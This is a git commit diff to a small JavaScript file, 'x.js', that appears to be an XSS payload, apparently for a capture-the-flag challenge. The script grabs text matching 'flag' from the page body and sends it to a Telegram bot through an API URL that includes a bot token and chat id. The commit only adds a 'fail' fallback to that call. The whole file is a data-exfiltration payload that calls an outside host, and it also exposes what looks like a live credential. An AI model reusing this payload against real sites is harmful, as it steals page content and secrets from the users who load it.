ed1ab98e7309f1eab0b2803c86e37e8b954a1701
Mirantsov Egor <36824733+Jodode@users.noreply.github.com>
2022-11-26 04:39:26 +0300

    Update x.js

--- x.js
+++ x.js
@@ -6,4 +6,4 @@ function httpGet(theUrl)
     return xmlHttp.responseText;
 }
 
-httpGet("https://api.telegram.org/bot5651288151:AAFRhSNqMzf7OSxySnPFK2UzzwM4ns3uHiw/sendMessage?chat_id=439546457&text=" + document.body.textContent.match(/flag.+/));
+httpGet("https://api.telegram.org/bot5651288151:AAFRhSNqMzf7OSxySnPFK2UzzwM4ns3uHiw/sendMessage?chat_id=439546457&text=" + (document.body.textContent.match(/flag.+/) || "fail"));
